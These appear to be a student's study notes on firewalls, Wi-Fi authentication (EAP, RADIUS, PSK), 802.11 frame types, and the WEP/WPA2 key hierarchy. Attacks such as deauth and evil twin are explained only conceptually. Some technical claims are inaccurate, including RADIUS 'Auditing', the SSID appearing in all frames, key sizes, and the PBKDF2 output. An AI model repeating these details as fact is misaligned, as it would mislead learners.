| **Static**    | **Rules are fixed, manually set, never change**                      |
| **Dynamic**   | **Rules can change automatically based on traffic**                  |
| **Stateless** | No memory, **each packet judged alone**                              |
| **Stateful**  | Tracks connection state, knows if packet belongs to existing session |

---

**2. Circuit-Level Gateway — Layer 5 (Session)**

A circuit-level gateway functions primarily at the **session layer of the OSI model.** Its role is to oversee and **validate the handshaking process between packets for TCP and UDP connections.** When a user seeks to initiate a connection with a remote host, the **circuit-level gateway establishes a circuit** — essentially a virtual connection between the user and intended host. [Palo Alto Networks](https://www.paloaltonetworks.com/cyberpedia/types-of-firewalls)

```
Looks at: Is this a legitimate session/handshake?
Does NOT look at: content inside packets
Key feature: Hides internal IPs from outside world (NAT)
```

While circuit-level gateways ensure that traffic is from a legitimate connection, they don't check the contents of the packet — **meaning a circuit-level gateway will permit malicious connections if they are properly established**. [Cato Networks](https://www.catonetworks.com/network-firewall/firewall-types/)

---

**3. Stateful Inspection Firewall — Layer 3/4**

Stateful inspection firewalls combine packet inspection technology and TCP handshake verification to offer more serious protection than either architecture could provide alone. They also keep a contextual database of vetted connections and draw on historical traffic records to make decisions. [Compuquip](https://www.compuquip.com/blog/types-firewall-architectures)

```
Looks at: packet headers + tracks entire connection state
Knows: "this packet is a response to a request made 2 seconds ago"
Smarter than basic packet filtering
```

---

**4. Application-Level Gateway / Proxy — Layer 7**

Application-layer proxy firewalls operate up to Layer 7. Unlike packet filter and stateful firewalls that make decisions based on layers 3 and 4 only, application-layer proxies can make filtering decisions based on application-layer data, such as HTTP traffic. This allows tighter control — instead of relying on IP addresses and ports alone, an HTTP proxy can also make decisions based on HTTP data, including the content of web data. [ScienceDirect](https://www.sciencedirect.com/topics/computer-science/packet-filtering-firewall)

```
Looks at: everything — including actual content of packets
Acts as: middleman between you and the internet
User never directly connects to destination
Proxy connects on your behalf
```

---

**5. Personal / Host-Based Firewall**

This is simply a firewall that runs on your **individual device** rather than at the network level:

```
Windows Defender Firewall = host based firewall
Protects just your machine
Not the whole network
```

https://www.compuquip.com/blog/types-firewall-architectures

## Wireless LAN Basics

1. WLAN: Wireless LAN uses radio waves as its carrier, **last link to users is wireless**
99% of the journey = wired (cables, fiber)
The FINAL hop from **router to your device = wireless radio waves**

Like a delivery truck:
Travels highways (wired internet backbone)
Last mile delivery to your door = the wireless part

2. "Same Protocols" — What Are They?
```
Layer 7 - HTTP, HTTPS, DNS, FTP    ← exactly the same
Layer 4 - TCP, UDP                 ← exactly the same
Layer 3 - IP addressing            ← exactly the same
Layer 2 - MAC addresses            ← same concept
Layer 1 - Physical transmission    ← THIS is where WiFi differs
                                      radio waves instead of cables
```

The only thing different is the **physical medium at Layer 1 — radio waves instead of copper/fiber. Everything above that is identical to wired networking**.

## 3. Access Point — Bridge Between Wireless and Wired

A networking hardware device that creates a local area network (WLAN), usually in an office or large building, by allowing Wi-Fi devices to connect to a wired network==. It acts as a bridge between wired and wireless, extending network coverage and supporting many users.

```
Your laptop (wireless) 
        ↓ radio waves
Access Point (your router/WiFi box)
        ↓ ethernet cable
Wired network → Internet

Access Point literally translates:
Radio wave signals → electrical signals in cable
Wireless world    → Wired world
```
3.  IEEE 802.11: Standardizes physical and medium access control layers. Variants: 802.11a/b/g/n have different signal ranges

4. WiFi Authentication. Pre-shared key (PSK) is most common. Enterprise uses EAP with RADIUS server.

## 5. WiFi Authentication

# Key Terminology

[](https://github.com/koutto/pi-pwnbox-rogueap/wiki/07.-WPA-WPA2-Enterprise-\(MGT\)#8021x-terminology)

**Supplicant** = The user or client device that wants to be authenticated and given access to the network.
    Eg. your laptop/phone
    
**Authenticator** = The device in between the **Supplicant and Authentication Server** (i.e. AP in wireless network).
Access Point is like a Middle man it does NOT check credentials itself Just passes messages between supplicant and authentication server Like a receptionist forwarding your ID to the security office

**Authentication server** = The actual server doing the authentication, typically a **RADIUS server**. (R**emote Authentication Dial-In User Service)**. Server that can be used to query either a local user database, or an external database via LDAP protocol.

**EAP (Extensible Authentication Protocol)** = Authentication framework, not a specific authentication mechanism. It provides various authentication methods. Some methods also support the encapsulation of an "inner method".

It defines how credentials are exchanged but not what credentials are used:
```
Without EAP:
WiFi only supported one authentication method
Passwords only, or certificates only
No flexibility

With EAP:
"Framework" = standardized conversation structure
AP says: "Use EAP to prove identity"
Client and server negotiate WHICH method:
→ Use certificates? (EAP-TLS)
→ Use username/password? (EAP-TTLS)
→ Use Microsoft tokens? (PEAP)
Same framework, different method inside
```
**PEAP for example:**
Outer layer: TLS tunnel established first
             (like HTTPS — encrypted channel)
Inner layer: Username/password sent
             INSIDE the encrypted tunnel
             
"Inner method" = the username/password exchange
"Encapsulated" = wrapped inside the TLS tunnel
                 protected from eavesdropping

**RADIUS = Remote Authentication Dial-In User Service**
Authentication
Authorization
Audting 
https://www.cisco.com/c/en/us/support/docs/security-vpn/remote-authentication-dial-user-service-radius/12433-32.html

## What is LDAP?

**Lightweight Directory Access Protocol** — a protocol for querying a directory of users:

```
LDAP = a phone book lookup protocol
"Is john@company.com a valid user?"
"What groups does John belong to?"
"What permissions does John have?"
```

```
Where user information lives:
Microsoft Active Directory ← most common in enterprises
OpenLDAP                   ← open source alternative
These are DATABASES of users, groups, permissions

LDAP = the LANGUAGE used to query these databases
Like SQL is the language for relational databases
LDAP is the language for directory databases
```
## How RADIUS and LDAP connect:**

```
RADIUS receives:
"Is john@company.com valid? Password: secret123"
        ↓
RADIUS does not store users itself
RADIUS asks Active Directory via LDAP:
"Hey AD, is john@company.com valid?"
        ↓
Active Directory checks its database
Responds via LDAP:
"Yes, John is valid, he is in these groups"
        ↓
RADIUS tells AP:
"Allow John, here are his permissions"
        ↓
AP grants access ✅
```
### Pre-Shared Key (PSK) — Home WiFi

This is what you use at home:

```
Router has one password: "MyWiFiPassword123"
Everyone who connects uses the SAME password
        ↓
Pros: Simple, easy to set up
Cons: Everyone shares one key
      If one person leaks it — everyone is compromised
      No way to track who is who
      Revoking access = change password for EVERYONE
```

---

## PSK vs EAP/RADIUS Side by Side

![[Pasted image 20260408181252.png]]

## Challenge-Response mechanism

![[Pasted image 20260409160015.png]]
Challenge-response flow: **AP sends challenge (plain)** → gives client something to encrypt Client encrypts it with PSK → proves knowledge without revealing key AP verifies by decrypting → if it matches, client is authentic 

**Why plain challenge first:** Creates a shared test case
Client has something specific to encrypt AP has something specific to verify against Challenge itself is not secret, response proves the secret PSK = yes, essentially the WiFi password.
Technically passphrase → PBKDF2 → actual 256 bit key But PSK and password refer to the same thing in practice 
Note placement: Under PSK authentication section 
As the authentication mechanism Before four-way handshake section (authentication happens first, then key exchange)
## What is SSID?

**Service Set Identifier** — simply the **name of your WiFi network.**

```
When you look at available WiFi networks on your phone:
"HomeNetwork_5G"        ← this is an SSID
"Starbucks WiFi"        ← this is an SSID
"FBI Surveillance Van"  ← this is an SSID (someone's joke)
"iPhone of John"        ← this is an SSID
```

Every wireless network must have an SSID so devices know **which network is which** when multiple WiFi networks exist in the same area.

## What is a Frame?

Wired network (Ethernet):
Data travels in PACKETS
Has: IP header + TCP header + data

WiFi network:
Data travels in FRAMES
Has: IP header + TCP header + data
   + extra WiFi specific fields:
     → Receiver MAC
     → Transmitter MAC
     → BSSID (AP identifier)
     → Sequence number
     → Frame type
     → Duration (how long channel is needed)

WiFi frames are split into three completely different categories:

## 1. Management Frames — Connection Control

These handle everything about **establishing and maintaining** the WiFi connection itself:

| Frame                | Direction     | Purpose                             |
| -------------------- | ------------- | ----------------------------------- |
| Beacon               | AP → Everyone | "I exist, here are my capabilities" |
| Probe Request        | Client → AP   | "Are you there?"                    |
| Probe Response       | AP → Client   | "Yes I am here"                     |
| Authentication       | Client ↔ AP   | Challenge-response                  |
| Association Request  | Client → AP   | "I want to join"                    |
| Association Response | AP → Client   | "Welcome" or "Denied"               |
| Deauthentication     | Either        | "You are disconnected"              |
| Disassociation       | Either        | "Leaving the network"               |

Key property: NEVER encrypted in WPA2 ❌ Exist BEFORE any keys are established 
Chicken and egg problem: Need frames to connect → need keys to encrypt 
Cannot have keys before connecting 
So management frames fly in plain text ↓ This is exactly why deauth attack works 
Attacker forges deauth management frame Client cannot verify authenticity Disconnects believing fake frame

```
┌─────────────────────────────────────────┐
│ 1. MANAGEMENT FRAMES                    │
│    Control the WiFi connection itself   │
│    Beacon, Probe, Association,          │
│    Deauthentication                     │
│    NEVER encrypted in WPA2 ❌           │
├─────────────────────────────────────────┤
│ 2. CONTROL FRAMES                       │
│    Low level transmission helpers       │
│    ACK, RTS, CTS                        │
│    Very small, timing related           │
├─────────────────────────────────────────┤
│ 3. DATA FRAMES                          │
│    Your actual content                  │
│    Web pages, messages, files           │
│    ENCRYPTED with TK ✅                 │
└─────────────────────────────────────────┘

Sometimes **SSID appears in ALL frames, not just beacons:**
                 |
```
## What Are Beacons?

This is the key concept. Your WiFi router is not silent, it is **constantly shouting its existence** to everyone nearby.

A **beacon frame** is a small packet your router broadcasts automatically:

```
Every 100 milliseconds your router shouts:
"HEY EVERYONE! 
 I am here!
 My name is HomeNetwork_5G
 I support these speeds...
 I use this security type...
 Come connect to me!"
```

This happens **continuously, 10 times per second, 24/7** whether anyone is connected or not.

## What's Inside a Beacon Frame

Every beacon contains:

```
┌─────────────────────────────────────┐
│ SSID: "HomeNetwork_5G"              │ ← network name
│ BSSID: AA:BB:CC:DD:EE:FF            │ ← router's MAC address
│ Channel: 6                          │ ← which frequency
│ Security: WPA2                      │ ← encryption type
│ Supported speeds: 54, 108, 300 Mbps │ ← capabilities
│ Timestamp                           │ ← timing sync
└─────────────────────────────────────┘
```

This broadcasts completely **openly in the air** — no authentication needed to read it.

## Why This is a Security Problem

```
Attacker sits in a car outside your building
Opens a WiFi analyzer tool
        ↓
Sees every beacon flying through the air:
"CompanyNetwork"     - WPA2 - Channel 6
"CompanyGuest"       - Open  - Channel 11  
"CompanyPrinters"    - WPA2  - Channel 1
"BackupNetwork_old"  - WEP   - Channel 6  ← old weak encryption!
        ↓
Attacker now knows:
→ How many networks exist
→ What security each uses
→ Which ones are old/weak
→ Router MAC addresses
→ Without connecting to anythin
```

## Can You Hide Your SSID?

You might have heard of **"hidden networks"** — disabling SSID broadcast:

```
Router stops sending beacons with SSID
Network doesn't appear in available WiFi list
Seems secure right?
```

But it's basically useless as a security measure:

```
The moment ANY device connects to your hidden network
The SSID appears in the association frames
Attacker captures it instantly
Tools like Wireshark/Kismet reveal hidden SSIDs 
in seconds once any device connects
```

## 2. Control Frames — Traffic Management

These are very small frames that help manage **how data flows** through the air:

**ACK — Acknowledgement:**

```
WiFi is unreliable — radio waves drop packets
Every data frame must be acknowledged:

Sender transmits frame
        ↓
Receiver gets it successfully
Receiver sends tiny ACK frame:
"I got it ✅"
        ↓
If sender does not receive ACK:
"Frame was lost, retransmit"
        ↓
This is how WiFi ensures reliability
Same concept as TCP ACK but at WiFi layer
```

**RTS — Request to Send:**

```
Problem: Hidden node problem

Laptop A ←→ AP ←→ Laptop B

A and B cannot hear each other
Both think channel is free
Both transmit simultaneously
Signals COLLIDE at AP
Both transmissions corrupted ❌
```

```
RTS solution:
Laptop A wants to transmit big frame:
A → AP: "RTS — I want to send 1000 bytes
         will take 5ms"
        ↓
AP receives RTS
AP broadcasts CTS (Clear to Send)
Everyone in range hears it
"A is about to transmit for 5ms
 everyone else stay silent"
        ↓
B hears CTS even though it cannot hear A
B knows: "Stay quiet for 5ms" ✅
A transmits without collision ✅
```

**CTS — Clear to Send:**

```
AP response to RTS:
"Channel is yours, go ahead"
Broadcast to entire area
All devices set a timer:
"Stay silent for this duration"
Prevents collisions ✅

CTS without RTS:
Sometimes used alone to silence the network
"Everyone be quiet, I am reserving the channel"
```

---

## 3. Data Frames — Your Actual Content

```
This is what you actually care about:
Web pages, emails, messages, files
Video streams, game data, anything

Structure of a data frame:
┌──────────────────────────────────────┐
│ MAC Header                           │
│ Receiver MAC, Transmitter MAC        │
│ BSSID, Sequence number               │
│ Frame type = DATA                    │
├──────────────────────────────────────┤
│ LLC Header                           │
│ "What protocol is inside?"           │
│ IPv4? IPv6? ARP?                     │
├──────────────────────────────────────┤
│ IP Header (inside)                   │
│ Source IP, Destination IP            │
├──────────────────────────────────────┤
│ TCP/UDP Header (inside)              │
│ Source port, Destination port        │
├──────────────────────────────────────┤
│ ACTUAL DATA (payload)                │
│ "GET /index.html HTTP/1.1"           │
│ Encrypted with TK in WPA2 ✅         │
├──────────────────────────────────────┤
│ MIC (8 bytes)                        │
│ Integrity check                      │
├──────────────────────────────────────┤
│ FCS — Frame Check Sequence           │
│ Error detection (like CRC)           │
└──────────────────────────────────────┘
```

---

## How All Three Work Together — Real Example

You opening google.com on office WiFi:

```
MANAGEMENT FRAMES (connection setup):
Beacon heard → probe request/response
Association request/response
Authentication (EAP/PSK)
Four-way handshake
All management, all plain text

CONTROL FRAMES (during data transfer):
Your laptop: RTS → "I want to send a request"
AP: CTS → "Go ahead, channel is yours"
        ↓
DATA FRAMES (actual content):
Laptop → AP: "GET google.com" (encrypted)
AP → Laptop: ACK ← control frame confirming receipt
        ↓
AP → Laptop: Google's response (encrypted)
Laptop → AP: ACK ← confirming receipt
        ↓
Every data frame gets an ACK
Every large transmission gets RTS/CTS
```

Note: All the frames have in a wireless or local area network have MC Address.
---
## Frame vs Packet — The Relationship

```
When you send data it gets wrapped in layers:

Application layer:
"GET /index.html HTTP/1.1"

TCP adds header:
[TCP header]["GET /index.html"]
= TCP segment

IP adds header:
[IP header][TCP header]["GET /index.html"]
= IP packet

WiFi adds header:
[WiFi header][IP header][TCP header]["GET..."]
= WiFi frame

Frame contains the packet inside it
Frame = outer WiFi envelope
Packet = letter inside the envelope
```

## Basic Frame Knowledge for Networking

Things worth knowing:

```
1. Every frame has MAC addresses
   Not IP addresses — MAC is Layer 2
   IP addresses are inside the frame
   MAC addresses are on the frame itself

2. Frames are **local network only** or **Wifi**
   Frame hops from device to device
   MAC addresses change at each hop
   IP addresses stay the same end to end

3. Frame size is limited
   Maximum frame size = MTU (1500 bytes)
   Larger data = multiple frames
   = fragmentation (remember Teardrop attack?)

4. WiFi frames have sequence numbers
   Helps detect lost/duplicate frames
   Replay detection uses this
   (similar to TCP sequence numbers)

5. Frame Check Sequence (FCS)
   At end of every frame
   Detects transmission errors
   Corrupted frame → FCS fails → discard → retransmit
   Different from MIC (FCS catches accidents
   MIC catches malicious modification)
```

## Connecting to Everything We Studied

```
Beacon frames    → SSID broadcasting we discussed
                   hidden SSID still revealed in
                   probe/association frames

Deauth frames    → management frame
                   KRACK used blocked ACK frames
                   WPA2 MitM attack used fake deauth

Data frames      → encrypted with TK
                   per-packet PN we discussed
                   MIC for integrity

RTS/CTS          → why WiFi needs collision avoidance
                   wired ethernet uses collision detection
                   wireless cannot detect while transmitting
                   so must AVOID collisions instead

ACK frames       → why KRACK worked
                   attacker blocked ACK (control frame)
                   AP thought Message 4 was lost
                   retransmitted Message 3
                   caused key reinstallation
```
## Summary

```
Frame = WiFi packet with extra wireless fields

Management frames:
→ Setup and maintain connection
→ Beacon, probe, association, deauth
→ Never encrypted → vulnerability
→ Exist before keys are established

Control frames:
→ Manage how data flows through air
→ ACK = confirm receipt of data frame
→ RTS = request permission to transmit
→ CTS = grant permission, silence others
→ Prevent collisions, ensure reliability

Data frames:
→ Your actual content
→ Contain IP packets inside
→ Encrypted with TK in WPA2
→ MIC for integrity
→ Per-packet PN for keystream uniqueness

Key relationships:
Frame contains packet inside it
Management frames enable data frames
Control frames coordinate data frames
All three needed for WiFi to function
```

## Wireless Vulnerabilities

1. CIA Triad Threats

**Confidentiality** (eavesdropping over air), **Integrity** (packet injection), **Availability** (jamming)

2. Unauthorized Access

**Anyone in radio range can attempt to connect**

3. Protocol Weaknesses

**Beacons broadcast SSID — anyone can discover the network**

4. Evil Twin / Rogue AP

Attacker sets up a fake access point with the same SSID. Victims connect to it unknowingly. Attacker can sniff all traffic.

5. SSID in All Frames

SSID is included in all wireless frames, making it easy to identify networks

## WEP — Wired Equivalent Privacy (Broken)

![[Pasted image 20260409170951.png]]

## The Weaknesses 

```
Static key + IV collisions:
→ Same keystream eventually reused
→ XOR two ciphertexts → plaintext exposed

RC4 used incorrectly:
→ Even without IV collision
→ Known plaintext attacks possible

Weak key size:
→ 40 bit = brute forceable in seconds
→ 104 bit = crackable via RC4 flaws

Faulty CRC:
→ Attacker modifies packets
→ Receiver accepts tampered data

No real authentication:
→ Know SSID + spoof MAC = inside
→ Pre-shared key never actually verified during auth

No single fix could save WEP
The entire design was fundamentally broken
WPA/WPA2 rebuilt everything from scratch
```

## WPA 
![[Pasted image 20260409173308.png]]

## WiFi Protected Access (WPA) 2

WPA2 uses a 4-way handshake to negotiate a fresh encryption key for each session.

Uses PBKDF2 key hierarchy — new keys generated per session, encryption key changed per packet. Supports AES encryption, 64-bit cryptographic integrity check, and authentication via password/token/certificate.

Note: WPA (2003) and WPA2 (2004) replaced WEP with major security improvements.

![[Pasted image 20260408223327.png]]
![[Pasted image 20260408223341.png]]
## 1. How WPA2 Key Hierarchy Works

```
Password "MyWiFiPassword"
        ↓ PBKDF2 (4096 rounds of hashing)
PMK — Pairwise Master Key (256 bit)
        ↓ Four-way handshake (uses random numbers)
PTK — session key (new every connection)
        ↓ per packet
Encryption key rotated every single frame
```

PBKDF2 "stretches" the password, running it through 4096 rounds of hashing makes brute forcing dramatically slower. Trying one password takes 4096 hashing operations instead of one.

## What PBKDF2 Actually Does — Step by Step

```
Inputs:
→ Password:   "MyWiFiPassword"
→ Salt:       "HomeNetwork"  ← the SSID is used as salt
→ Iterations: 4096           ← number of rounds
→ Output length: 256 bits

Step 1:
HMAC-SHA1("MyWiFiPassword" + "HomeNetwork") 
= some 160 bit hash H1

Step 2:
HMAC-SHA1("MyWiFiPassword" + H1)
= some 160 bit hash H2

Step 3:
HMAC-SHA1("MyWiFiPassword" + H2)
= some 160 bit hash H3

...repeat 4096 times total...

Step 4096:
HMAC-SHA1("MyWiFiPassword" + H4095)
= final hash H4096

Final output:
XOR all intermediate hashes together
= 256 bit PMK  ← the actual key used
```
## The SSID as Salt — Why This Matters

Notice the SSID "HomeNetwork" is used as the **salt.** This is crucial:

```
Without salt:
"password123" → PBKDF2 → always same PMK
Attacker precomputes table of common passwords:
"password"    → PMK_1
"password123" → PMK_2
"qwerty"      → PMK_3
... millions of entries ...
Called a Rainbow Table

Capture your handshake
Look up PMK in precomputed table
Instant crack ❌
```

```
With SSID as salt:
"password123" + "HomeNetwork" → PMK_A
"password123" + "Starbucks"   → PMK_B
"password123" + "OfficeWiFi"  → PMK_C

Completely different PMK for every network
Even with identical password
        ↓
Attacker cannot reuse precomputed tables
Must compute from scratch for every SSID ✅
Dramatically more work
```
---

## Why 4096 Rounds — The Key Innovation

This is what makes PBKDF2 special — **intentional slowness:**

```
Normal SHA1 hash:
One password attempt = 1 hash operation
Modern GPU = 10 billion hashes per second
10 billion passwords tried per second ❌

PBKDF2 with 4096 rounds:
One password attempt = 4096 hash operations
Same GPU = 10 billion ÷ 4096 = 2.4 million per second
4000x slower per attempt ✅
```
https://crypto.stackexchange.com/questions/28975/encryption-algorithm-used-in-wpa-wpa2#:~:text=The%20WPA/WPA2%20password%20encryption%20algorithm%20uses%20a,be%208%20to%2063%20characters%20in%20size.

## What is the PMK?

**Pairwise Master Key** — the 256 bit cryptographic key that PBKDF2 produces from your password.

```
"MyWiFiPassword" + "HomeNetwork" (SSID)
        ↓ PBKDF2 (4096 rounds)
PMK = "a3f9b2c8d4e1f7a0b5c2d8e3f1a9b4c7..."
      (256 bits of cryptographic material)
```

The word **Pairwise** means it is specific to one pair:
```
One client ←→ One Access Point = One PMK

SSID unique name for a Wi-Fi network
```

PBKDF2 inputs:
→ Password:  "MyWiFiPassword"
→ Salt:      "HomeNetwork" (SSID)
→ Rounds:    4096
→ That is it — no MAC addresses involved

PMK = PBKDF2("MyWiFiPassword", "HomeNetwork", 4096)

Your laptop  → same inputs → same PMK ✅
Your phone   → same inputs → same PMK ✅
Your roommate→ same inputs → same PMK ✅

---
## What PMK is NOT

This is the most important thing to understand:

```
PMK is NEVER used to encrypt actual data
PMK is NEVER transmitted across the network
PMK **just sits on both sides (client + AP)**
        ↓
PMK is purely a ROOT KEY
Like a master key that generates other keys
but never touches a lock directly
```
## PMK's Only Job, Proving Both Sides Know the Password

```
Client has PMK (derived from password locally)
AP has PMK (derived from same password locally)
        ↓
Neither side ever sends the password or PMK
        ↓
Instead they PROVE to each other:
"I have the same PMK as you"
"Therefore I know the correct password"
"Therefore I am legitimate"
```

## Quick Recap — Why PTK Exists

```
PMK has one problem:
Same key used across many sessions
If somehow compromised:
ALL past and future sessions exposed ❌
        ↓
Solution:
Derive a FRESH key for every single session
That key = PTK
```

## What is the PTK?

**Pairwise Transient Key** — the actual working session key derived from the PMK plus random numbers from both sides.
```
PMK (long term root key)
+
ANonce (random number from AP)
+
SNonce (random number from Client)
+
AP MAC address
+
Client MAC address
        ↓ PRF (Pseudo Random Function)
PTK (session key — unique every time)
```
Note:- Just understand on high level that some kind of XOR operation is being conducted. 

The word **Transient** tells you everything:
```
Transient = temporary, short lived, disposable
PMK = permanent (until password changes)
PTK = transient (dies when session ends)
```
## The Nonces — Why They Make PTK Unique

This is the clever part. Both sides contribute randomness:

```
ANonce = Access Point Nonce
→ AP generates fresh random number
→ Never used before
→ Sent to client in Message 1 of handshake

SNonce = Supplicant (Client) Nonce  
→ Client generates fresh random number
→ Never used before
→ Sent to AP in Message 2 of handshake
```
## PTK Sub-keys Pairwise Transient Keys
```
PTK (512 bits)
│
├── KCK (128 bits)
│   → MIC on handshake messages ONLY
│   → Job ends after handshake completes
│
├── KEK (128 bits)
│   → Encrypts GTK for delivery in Message 3
│   → Job ends after handshake completes
│
└── TK (256 bits)
    → Encrypts ALL data frames ✅
    → MIC on ALL data frames ✅
    → Does BOTH jobs after handshake
    → The only sub-key used ongoing

```
## What is MIC?

**Message Integrity Code** — a cryptographic fingerprint attached to every frame proving it was not tampered with.

Sender side:
Take the frame content
Run it through AES using KCK as the key
Produces 8 bytes = the MIC
Attach MIC to the frame
Send it

Receiver side:
Receive frame + MIC
Independently calculate MIC using same KCK
Compare:

Calculated MIC = Received MIC → ✅ authentic
Calculated MIC ≠ Received MIC → ❌ tampered, DROP

## Why KCK specifically generates MIC:**

```
KCK = Key Confirmation Key (first 128 bits of PTK)
Used ONLY during the four-way handshake
Specifically to protect handshake messages
Making sure nobody tampers with the handshake itself

After handshake is complete:
KCK's job is done
TK takes over for data encryption
```

## MIC vs CRC (WEP's broken version):**

```
WEP used CRC32:
Mathematical formula — no secret key involved
Attacker knows the formula
Can modify packet AND recalculate CRC
Receiver accepts tampered packet ❌

WPA2 MIC:
Requires KCK or TK to calculate
Attacker doesn't have these keys
Cannot forge a valid MIC
Receiver rejects tampered packet ✅
```

Each sub-key has ONE specific job and never crosses into another's territory.

## What is GTK?

**Group Temporal Key** — a completely separate key for broadcast and multicast traffic.

First understand why it exists:

```
PTK is PAIRWISE:
One unique PTK per client-AP pair

Your laptop  ←→ AP = PTK_1
Your phone   ←→ AP = PTK_2
Roommate     ←→ AP = PTK_3

PTK encrypts traffic between ONE client and AP
Works perfectly for direct communication ✅

But what about BROADCAST traffic?
AP sends to ALL devices simultaneously:
"New router firmware available"
"DHCP offer to everyone"
ARP broadcasts
        ↓
AP cannot use PTK_1 to encrypt
because phone and roommate don't have PTK_1
AP cannot encrypt separately for each client
Too slow, too much overhead
        ↓
Need ONE shared key all clients know
= GTK (Group Temporal Key)
```

### **How GTK is delivered:**

```
AP generates ONE GTK for the whole network
        ↓
Four-way handshake Message 3:
AP encrypts GTK using KEK (Key Encryption Key)
"Here is the GTK, encrypted so only you can read it"
        ↓
Each client receives GTK encrypted with their own KEK
Decrypts it using their KEK
Now has the GTK ✅
        ↓
All clients share same GTK
AP broadcasts using GTK
All clients can decrypt ✅
Nobody outside network has GTK ✅
```

### **GTK security properties:**

```
GTK is rotated periodically:
→ When any client leaves the network
→ On a timer (typically every hour)
        ↓
Why? If old client kept GTK:
They could still decrypt broadcast traffic
Even after being disconnected ❌

New GTK distributed to remaining clients
Old client's GTK becomes useless ✅


# Note: GTK is completely separate from PTK.** This is a common confusion. 

```
PTK (Pairwise Transient Key):
→ Pairwise = between ONE client and AP
→ Unique per client
→ Generated from PMK + nonces
→ Split into KCK + KEK + TK
→ Your laptop's PTK ≠ your phone's PTK

``
## Data Frames — What Temporal Key Actually Encrypts

After the handshake is complete TK takes over:

```
You open YouTube in browser:
Browser sends HTTP request
        ↓
Travels down network stack
Reaches WiFi layer
        ↓
WiFi wraps it in a DATA FRAME:
┌──────────────────────────────────────┐
│ Frame Header (MAC addresses, type)   │
├──────────────────────────────────────┤
│ Encrypted Payload (TK encrypts this) │
│ "GET youtube.com/watch?v=..."        │
│ → becomes [gibberish] ✅             │
├──────────────────────────────────────┤
│ MIC (8 bytes integrity check)        │
└──────────────────────────────────────┘
        ↓
Sent over air as radio waves
        ↓
AP receives frame
Decrypts payload using TK ✅
Forwards your request to internet
```

## MIC Uses KCK or TK?

You're absolutely right to question this — I was imprecise earlier. Let me correct it properly.

**MIC is used in TWO different places with TWO different keys:**

```
DURING HANDSHAKE:
MIC generated using KCK
Protects handshake messages themselves
"This handshake message is authentic"

AFTER HANDSHAKE (data frames):
MIC generated using TK
Protects every data frame
"This data packet is authentic and unmodified"
```

So more precisely:

```
KCK → MIC for HANDSHAKE frames only
TK  → MIC for DATA frames only

KCK's job ends when handshake completes
TK takes over EVERYTHING after that
Both encryption AND integrity of data frames
```
### How does WPA2 change the encryption key per packet?

##Where We Are in the Key Hierarchy

```
Password → PBKDF2 → PMK → Four-way handshake → PTK
                                                  ↓
                                            TK (Temporal Key)
                                            THIS is where
                                            per-packet keys start
```

The TK from the PTK is the **starting point** for per-packet encryption — but it never directly encrypts data either.

---

## The Problem With Using TK Directly

```
If TK encrypted every packet directly:

Packet 1: TK encrypts data_1 → ciphertext_1
Packet 2: TK encrypts data_2 → ciphertext_2
Packet 3: TK encrypts data_3 → ciphertext_3

Same key used every time
        ↓
Attacker collects enough ciphertext
Performs statistical analysis
Same key = patterns emerge across packets
Eventually key is crackable ❌

Remember RC4 in WEP?
Same problem — reusing keystream
XOR two ciphertexts → expose plaintext
WPA2 specifically designed to avoid this
```
## How WPA2 Solves This — TKIP vs CCMP

WPA2 uses two possible protocols for per-packet key mixing:

```
WPA  (2003) → TKIP (transitional, still had weaknesses)
WPA2 (2004) → CCMP with AES (proper solution)
```

Let me explain both:

## TKIP — How WPA (First Version) Did It

**Temporal Key Integrity Protocol:**

```
Inputs to per-packet key:
TK (128 bit temporal key)
+
Transmitter MAC address
+
TSC (TKIP Sequence Counter — increments per packet)
        ↓ Two phase mixing function
Per-packet RC4 key (unique for every packet)
        ↓
Encrypts that one packet
        ↓
Next packet:
TSC increments by 1
Completely different per-packet key generated
```

```
Packet 1: TK + MAC + TSC=000001 → unique_key_1
Packet 2: TK + MAC + TSC=000002 → unique_key_2
Packet 3: TK + MAC + TSC=000003 → unique_key_3

Every packet gets its own unique key
Even though TK stays the same ✅
```

**TKIP also added sequence checking:**

```
Receiver checks: did TSC increment correctly?
TSC=000001 → 000002 → 000003 ✅
TSC=000001 → 000001 → replayed packet ❌ REJECTED
TSC=000001 → 000005 → packets missing ⚠️

Prevents replay attacks we discussed earlier
Attacker cannot capture and resend old packets
```

**TKIP's weakness:**

```
Still used RC4 underneath
RC4 itself has mathematical weaknesses
TKIP was designed as temporary fix
To work on old WEP hardware
Not a permanent solution
```

---

## CCMP — How WPA2 Properly Does It

**Counter Mode CBC-MAC Protocol** — uses AES instead of RC4:

```
Per-packet inputs:
TK (128 bit temporal key)
+
PN (Packet Number — 48 bit counter)
+
MAC address
+
Additional header data
        ↓ AES in Counter Mode (CTR)
Unique keystream for this packet only
        ↓
XOR with plaintext data
= Ciphertext ✅
```

**The Packet Number (PN) is crucial:**

```
Packet 1: PN = 000000000001
Packet 2: PN = 000000000002
Packet 3: PN = 000000000003
...
Packet N: PN = unique 48-bit counter value

48 bits = 281 trillion possible values
Network would need to run for
millions of years before PN repeats ✅
IV collision problem from WEP = completely solved
```

---

## AES Counter Mode — How it Actually Works

```
AES normally encrypts one 128 bit block at a time
Counter mode makes it a stream cipher:

Step 1: Create a unique counter block per packet
        Counter = PN + MAC + other fields

Step 2: AES encrypts the counter block:
        AES(TK, Counter_1) = Keystream_block_1
        AES(TK, Counter_2) = Keystream_block_2
        AES(TK, Counter_3) = Keystream_block_3

Step 3: XOR keystream with plaintext:
        Data_block_1 XOR Keystream_block_1 = Ciphertext_1
        Data_block_2 XOR Keystream_block_2 = Ciphertext_2

Even if same data sent twice:
Different PN → different counter → different keystream
Different ciphertext every time ✅
Attacker cannot detect repeated content
```

---

## The MIC — Integrity Per Packet

On top of encryption CCMP adds a **Message Integrity Code:**

```
Before sending each packet:
AES-CBC-MAC runs over:
→ Packet header
→ Encrypted data
→ Packet number
        ↓
Produces 8 byte MIC (integrity tag)
Attached to every packet

Receiver:
Recalculates MIC independently
Compares with received MIC
Match → packet authentic and unmodified ✅
No match → packet tampered → DROPPED ❌
```

This fixes WEP's broken CRC checksum:

```
WEP CRC:   mathematical, attacker can recalculate ❌
WPA2 MIC:  cryptographic, requires TK to calculate ✅
           attacker cannot forge without knowing TK
```

## Full Per-Packet Flow Visualized

```
New packet to send:
"GET /index.html HTTP/1.1"
        ↓
Step 1: Increment PN
PN = 000000000047 (this is packet 47)

Step 2: Build counter block
Counter = PN + Sender MAC + Priority bits

Step 3: Generate keystream
AES(TK, Counter) = unique keystream for packet 47

Step 4: Encrypt
"GET /index.html..." XOR keystream = [gibberish]

Step 5: Calculate MIC
